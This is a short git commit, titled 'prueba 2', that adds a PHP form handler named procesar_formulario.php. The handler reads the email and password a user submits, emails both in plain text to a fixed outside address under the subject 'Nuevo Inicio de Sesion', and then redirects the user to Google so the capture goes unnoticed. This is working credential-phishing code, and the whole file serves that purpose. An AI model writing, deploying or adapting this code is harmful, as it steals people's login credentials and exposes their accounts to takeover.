3e6906ffb466cb049bd8ed321eb13fd880af3923
StevenMontoya12 <linkinpark12345678900@gmail.com>
2024-03-06 21:43:26 -0600

    prueba 2

---
+++ procesar_formulario.php
@@ -0,0 +1,19 @@
+<?php
+// Verificar si se ha enviado el formulario
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+  // Obtener los datos del formulario
+  $email = $_POST['email'];
+  $password = $_POST['password'];
+
+  // Enviar el correo electrónico
+  $to ="steven.montoya19@unach.mx";
+  $subject = "Nuevo Inicio de Sesion";
+  $message = "Correo electronico: $email\nContraseña: $password";
+  mail($to, $subject, $message);
+
+  // Redirigir al usuario a Google
+  header("Location: https://www.google.com");
+  exit();
+}
+
+?>
